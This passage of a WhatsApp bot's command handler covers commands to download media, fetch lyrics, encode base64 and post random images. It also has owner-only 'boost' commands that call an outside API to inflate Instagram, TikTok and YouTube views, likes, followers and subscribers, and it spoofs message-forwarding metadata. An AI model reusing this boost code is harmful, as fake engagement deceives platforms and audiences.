    resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('Instagram boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'tiktokboost2':
case 'ttboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/... | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost v2… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost v2 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'youtubeboost2':
case 'ytboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost v2… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost v2 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'instagramboost3':
case 'igboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: followers, likes, views, comments\n` +
    `Examples:\n${prefix}${cmd} https://www.instagram.com/username | followers\n` +
    `${prefix}${cmd} https://www.instagram.com/p/... | likes`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'followers').toLowerCase();
  const validTypes = ['followers', 'likes', 'views', 'comments'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    if (!url.includes('instagram.com/') && !url.startsWith('@')) {
      return reply('❌ For followers, provide a valid Instagram profile URL or username');
    }
  } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
    return reply('❌ For likes/views/comments, provide a valid post or reel URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing Instagram boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/Instagram/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
    resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('Instagram boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'tiktokboost3':
case 'ttboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/... | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}

case 'youtubeboost3':
case 'ytboost3': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost v3… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost3?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost v3 error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}
    
    case 'play': {
  const query = text;
  if (!query) {
    await reply(`🎵 *ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 Play*\n\nUsage: ${prefix}play2 [song name]\nExample: ${prefix}play2 faded`);
    break;
  }
  await reaction('🎧');
  await reply(`⏳ *Searching:* ${query}\nGive me a moment...`);
  try {
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/play?query=${encodeURIComponent(query)}&apikey=`,
      { timeout: 60000 }
    );
    const data = response.data;
    if (data.status && data.result?.download_url) {
      const audioRes = await axios.get(data.result.download_url, {
        responseType: 'arraybuffer',
        timeout: 120000,
      });
      const audioBuffer = Buffer.from(audioRes.data);
      await sock.sendMessage(jid, {
        audio: audioBuffer,
        mimetype: 'audio/mpeg',
        fileName: `${data.result.title}.mp3`,
        contextInfo: {
          externalAdReply: {
            thumbnailUrl: data.result.thumbnail,
            title: data.result.title,
            body: `👁️ ${(data.result.views || 0).toLocaleString()} views • ⏱️ ${data.result.duration || 'N/A'}`,
            sourceUrl: data.result.video_url,
            renderLargerThumbnail: true,
            mediaType: 1,
          },
        },
      }, { quoted: m });
      await reaction('✅');
    } else {
      throw new Error('No download URL received');
    }
  } catch (err) {
    console.error('play2 Error:', err);
    await reaction('❌');
    if (err.response?.status === 404) {
      await reply(`❌ Track "${query}" not found. Try a different song.`);
    } else {
      await reply(`⚠️ Music service error. Try again later.`);
    }
  }
  break;
}



    case 'playdoc': {
      const query2 = text;
      if (!query2) { await reply(`🎵 ${prefix}playdoc <song name>`); break; }
      await reaction('⬇️');
      try {
        const yts = require('yt-search');
        const search = await yts(query2);
        const video = search.videos?.[0] || search.all?.[0];
        if (!video) throw new Error('No results found');
        const { data } = await axios.get(
          `https://api.privatezia.biz.id/api/downloader/ytmp3?url=${encodeURIComponent(video.url)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('API failed');
        const dlUrl = data.result?.downloadUrl || data.url;
        if (!dlUrl) throw new Error('No download URL');
        await reply(`⬇️ Downloading *${video.title}*...`);
        const dlRes = await axios.get(dlUrl, { responseType: 'arraybuffer', timeout: 30000 });
        const buf   = Buffer.from(dlRes.data);
        const fname = video.title.replace(/[^\w\s]/g, '').trim() + '.mp3';
        await sock.sendMessage(jid, {
          document: buf,
          mimetype: 'audio/mpeg',
          caption:  ft(`🎵 ${video.title}\n© ${settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}`, sock),
          fileName: fname,
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ Failed: ' + e.message); }
      break;
    }

    // ── YouTube Video Download ────────────────────────────
    case 'ytmp4': {
      if (!text) { await reply(`${prefix}ytmp4 <YouTube link or title>`); break; }
      await reaction('🎬');
      await reply('⏳ Processing video...');
      try {
        const yts = require('yt-search');
        const isUrl = text.includes('youtu');
        let videoUrl = text;
        let videoTitle = 'video';
        if (!isUrl) {
          const search = await yts(text);
          const v = search.videos?.[0];
          if (!v) throw new Error('No results');
          videoUrl = v.url;
          videoTitle = v.title;
        }
        const { data } = await axios.get(
          `https://api.privatezia.biz.id/api/downloader/ytmp4?url=${encodeURIComponent(videoUrl)}`,
          { timeout: 25000 }
        );
        const dlUrl = data?.result?.downloadUrl || data?.url;
        if (!dlUrl) throw new Error('No video URL');
        await sock.sendMessage(jid, {
          video: { url: dlUrl },
          caption: ft(`🎬 ${videoTitle}`, sock),
          fileName: videoTitle.replace(/[^\w\s]/g,'').trim() + '.mp4',
        }, { quoted: qchanel });
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Lyrics ───────────────────────────────────────────
    case 'lyrics': {
      if (!text) { await reply(`${prefix}lyrics <song name>`); break; }
      await reaction('🎤');
      try {
        const { data } = await axios.get(
          `https://some-random-api.com/lyrics?title=${encodeURIComponent(text)}`,
          { timeout: 10000 }
        );
        if (!data?.lyrics) throw new Error('Not found');
        const lrc = data.lyrics.length > 3000 ? data.lyrics.slice(0, 3000) + '...' : data.lyrics;
        await reply(`🎤 *${data.title}*\n👤 ${data.author}\n\n${lrc}`);
      } catch { await reply('❌ Lyrics not found. Try a different song title.'); }
      break;
    }

    // ── Instagram downloader ──────────────────────────────
    case 'instagram':
    case 'ig': {
      const igUrl = args[0];
      if (!igUrl?.includes('instagram.com')) { await reply(`${prefix}instagram <post/reel url>`); break; }
      await reaction('📸');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/instagram?url=${encodeURIComponent(igUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status || !data.result?.url) throw new Error('Failed');
        const r = data.result;
        if (r.type === 'video') {
          await sock.sendMessage(jid, { video: { url: r.url }, caption: ft(r.caption || '📸 Instagram', sock) }, { quoted: qchanel });
        } else {
          await replyImg(r.url, r.caption?.slice(0,200) || '📸 Instagram');
        }
      } catch (e) { await reply('❌ Instagram download failed: ' + e.message); }
      break;
    }

    // ── TikTok downloader ────────────────────────────────
    case 'tiktok':
    case 'tt': {
      const ttUrl = args[0];
      if (!ttUrl?.includes('tiktok.com')) { await reply(`${prefix}tiktok <tiktok video url>`); break; }
      await reaction('🎵');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/tiktok?url=${encodeURIComponent(ttUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status || !data.result?.video) throw new Error('Failed');
        const r = data.result;
        await sock.sendMessage(jid, { video: { url: r.video }, caption: ft(r.title || '🎵 TikTok', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ TikTok download failed: ' + e.message); }
      break;
    }

    // ── Facebook downloader ──────────────────────────────
    case 'facebook':
    case 'fb': {
      const fbUrl = args[0];
      if (!fbUrl?.includes('facebook.com') && !fbUrl?.includes('fb.watch')) { await reply(`${prefix}facebook <facebook video url>`); break; }
      await reaction('📘');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/facebook?url=${encodeURIComponent(fbUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        const videoUrl = r?.sd || r?.hd || r?.video;
        if (!videoUrl) throw new Error('No video URL');
        await sock.sendMessage(jid, { video: { url: videoUrl }, caption: ft('📘 Facebook', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ Facebook download failed: ' + e.message); }
      break;
    }

    // ── Twitter/X downloader ─────────────────────────────
    case 'twitter':
    case 'x': {
      const twUrl = args[0];
      if (!twUrl?.includes('twitter.com') && !twUrl?.includes('x.com')) { await reply(`${prefix}twitter <tweet/video url>`); break; }
      await reaction('🐦');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/twitter?url=${encodeURIComponent(twUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        const videoUrl = r?.video || r?.url;
        if (!videoUrl) throw new Error('No URL');
        await sock.sendMessage(jid, { video: { url: videoUrl }, caption: ft('🐦 Twitter/X', sock) }, { quoted: qchanel });
      } catch (e) { await reply('❌ Twitter download failed: ' + e.message); }
      break;
    }

    // ── Pinterest downloader ──────────────────────────────
    case 'pinterest': {
      const pinUrl = args[0];
      if (!pinUrl?.includes('pinterest')) { await reply(`${prefix}pinterest <pinterest url>`); break; }
      await reaction('📌');
      try {
        const { data } = await axios.get(
          `https://api.ootaizumi.web.id/downloader/pinterest?url=${encodeURIComponent(pinUrl)}`,
          { timeout: 20000 }
        );
        if (!data?.status) throw new Error('Failed');
        const r = data.result;
        if (r?.video) {
          await sock.sendMessage(jid, { video: { url: r.video }, caption: '📌 Pinterest' }, { quoted: qchanel });
        } else if (r?.image) {
          await replyImg(r.image, '📌 Pinterest');
        } else throw new Error('No media found');
      } catch (e) { await reply('❌ Pinterest download failed: ' + e.message); }
      break;
    }

    // ── Spotify track info ────────────────────────────────
    case 'spotify': {
      if (!text) { await reply(`${prefix}spotify <track name>`); break; }
      await reaction('🎧');
      try {
        const { data } = await axios.get(
          `https://some-random-api.com/others/spotify?q=${encodeURIComponent(text)}`,
          { timeout: 10000 }
        );
        if (!data?.title) throw new Error('Not found');
        const bar = `▓`.repeat(Math.floor((data.duration_ms/100)/60000 * 20)).padEnd(20,'░');
        await replyImg(
          data.album_art,
          `🎧 *${data.title}*\n👤 ${data.artists?.join(', ') || 'Unknown'}\n💿 ${data.album}\n⏱ ${Math.floor(data.duration_ms/60000)}:${String(Math.floor((data.duration_ms%60000)/1000)).padStart(2,'0')}\n\n[${bar}]`
        );
      } catch { await reply('❌ Spotify track not found.'); }
      break;
    }

    // ── Base64 encode/decode ──────────────────────────────
    case 'base64': {
      if (!text) { await reply(`${prefix}base64 <text>`); break; }
      await reply(`📦 *Base64 Encoded:*\n${Buffer.from(text).toString('base64')}`);
      break;
    }

    case 'unbase64': {
      if (!text) { await reply(`${prefix}unbase64 <base64 string>`); break; }
      try {
        const decoded = Buffer.from(text, 'base64').toString('utf8');
        await reply(`📦 *Decoded:*\n${decoded}`);
      } catch { await reply('❌ Invalid base64 string.'); }
      break;
    }
// ─── RANDOM IMAGES ──────────────────────────────────────

case 'randombluearchiver':
case 'bluearchiver':
case 'randomchina':
case 'china':
case 'randomindo':
case 'indo':
case 'randomwaifu':
case 'waifu':
case 'randomneko':
case 'neko':
case 'randomvietnam':
case 'vietnam':
case 'randomthailand':
case 'thailand':
case 'randomkorea':
case 'korea':
case 'randomjapan':
case 'japan': {
  await reaction('🎨');

  const imageMap = {
    randombluearchiver: 'https://api.siputzx.my.id/api/r/blue-archive',
    bluearchiver: 'https://api.siputzx.my.id/api/r/blue-archive',
    randomchina: 'https://api.siputzx.my.id/api/r/cecan/china',
    china: 'https://api.siputzx.my.id/api/r/cecan/china',
    randomindo: 'https://api.siputzx.my.id/api/r/cecan/indonesia',
    indo: 'https://api.siputzx.my.id/api/r/cecan/indonesia',
    randomwaifu: 'https://api.siputzx.my.id/api/r/waifu',
    waifu: 'https://api.siputzx.my.id/api/r/waifu',
    randomneko: 'https://api.siputzx.my.id/api/r/neko',
    neko: 'https://api.siputzx.my.id/api/r/neko',
    randomvietnam: 'https://api.siputzx.my.id/api/r/cecan/vietnam',
    vietnam: 'https://api.siputzx.my.id/api/r/cecan/vietnam',
    randomthailand: 'https://api.siputzx.my.id/api/r/cecan/thailand',
    thailand: 'https://api.siputzx.my.id/api/r/cecan/thailand',
    randomkorea: 'https://api.siputzx.my.id/api/r/cecan/korea',
    korea: 'https://api.siputzx.my.id/api/r/cecan/korea',
    randomjapan: 'https://api.siputzx.my.id/api/r/cecan/japan',
    japan: 'https://api.siputzx.my.id/api/r/cecan/japan',
  };

  const url = imageMap[cmd];
  if (!url) {
    await reply(`❌ Random image "${cmd}" not found.`);
    break;
  }

  try {
    const data = await fetchJson(url);
    if (!data?.url) {
      await reply(`❌ Failed to fetch ${cmd} image.`);
      break;
    }

    const caption = `🎨 *${cmd.toUpperCase()}*\nHere's your random image!`;

    await sock.sendMessage(jid, {
      image: { url: data.url },
      caption: caption,
      viewOnce: true,
      contextInfo: {
        isForwarded: false,
        forwardingScore: 9999,
        forwardedNewsletterMessageInfo: {
          newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
          newsletterName: settings.CHANNEL_NAME || '〖 🟢 SAMSUNG XMD 🟢 〗'
        },
        externalAdReply: {
          title: ft(cmd.toUpperCase(), sock),
          body: ft(`Random ${cmd} image`, sock),
          thumbnailUrl: data.url,
          renderLargerThumbnail: true,
          mediaType: 1,
          previewType: 1,
        }
      }
    }, { quoted: m });

  } catch (e) {
    console.error('[RANDOM]', e);
    await reply(`❌ Failed to fetch ${cmd}: ${e.message}`);
  }
  break;
}// ─── ANIME COMMANDS ──────────────────────────────────────

case 'naruto':
case 'onepiece':
case 'cosplay':
case 'mikasa':
case 'nezuko':
case 'sasuke':
case 'itachi':
case 'sakura':
case 'hinata':
case 'lisa':
case 'madara':
case 'miku':
case 'akiyama':
case 'ana':
case 'art':
case 'asuna':
case 'boruto':
case 'bts':
case 'cartoon':
case 'chiho':
case 'chitoge':
case 'cosplayloli':
case 'cosplaysagiri':
case 'cyber':
case 'deidara':
case 'doraemon':
case 'elaina':
case 'emilia':
case 'erza':
case 'exo':
case 'gamewallpaper':
case 'gremory':
case 'hacker':
case 'hestia':
case 'husbu':
case 'inori':
case 'islamic':
case 'isuzu':
case 'itori':
case 'jennie':
case 'jiso':
case 'justina':
case 'kaga':
case 'kagura':
case 'kakasih':
case 'kaori':
case 'keneki':
case 'kotori':
case 'kurumi':
case 'megumin':
case 'mikey':
case 'minato':
case 'mountain':
case 'neko2':
case 'nekonime':
case 'pentol':
case 'pokemon':
case 'programming':
case 'randomnime':
case 'randomnime2':
case 'rize':
case 'rose':
case 'sagiri':
case 'satanic':
case 'shina':
case 'shinka':
case 'shinomiya':
case 'shizuka':
case 'shota':
case 'shortquote':
case 'space':
case 'technology':
case 'tejina':
case 'toukachan':
case 'tsunade':
case 'yotsuba':
case 'yuki':
case 'yulibocil':
case 'yumeko': {
  await reaction('🎨');

  // Map command to JSON URL
  const urlMap = {
    akiyama: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json',
    ana: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json',
    art: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/art.json',
    asuna: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/asuna.json',
    ayuzawa: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ayuzawa.json',
    boruto: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/boruto.json',
    bts: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/bts.json',
    cartoon: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cartoon.json',
    chiho: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chiho.json',
    chitoge: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/chitoge.json',
    cosplay: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplay.json',
    cosplayloli: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplayloli.json',
    cosplaysagiri: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cosplaysagiri.json',
    cyber: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/cyber.json',
    deidara: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/deidara.json',
    doraemon: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/doraemon.json',
    elaina: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/elaina.json',
    emilia: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/emilia.json',
    erza: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/erza.json',
    exo: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/exo.json',
    gamewallpaper: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gamewallpaper.json',
    gremory: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/gremory.json',
    hacker: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hekel.json',
    hestia: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/hestia.json',
    husbu: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/husbu.json',
    inori: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/inori.json',
    islamic: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/islamic.json',
    isuzu: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/isuzu.json',
    itachi: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itachi.json',
    itori: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/itori.json',
    jennie: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jeni.json',
    jiso: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/jiso.json',
    justina: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/justina.json',
    kaga: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaga.json',
    kagura: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kagura.json',
    kakasih: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kakasih.json',
    kaori: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kaori.json',
    keneki: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/keneki.json',
    kotori: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kotori.json',
    kurumi: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/kurumi.json',
    lisa: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/lisa.json',
    madara: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/madara.json',
    megumin: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/megumin.json',
    mikasa: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikasa.json',
    mikey: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mikey.json',
    miku: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/miku.json',
    minato: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/minato.json',
    mountain: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/mountain.json',
    naruto: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/naruto.json',
    neko2: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/neko2.json',
    nekonime: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nekonime.json',
    nezuko: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/nezuko.json',
    onepiece: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/onepiece.json',
    pentol: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pentol.json',
    pokemon: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/pokemon.json',
    programming: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/programming.json',
    randomnime: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime.json',
    randomnime2: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/randomnime2.json',
    rize: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rize.json',
    rose: 'https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/rose.json',
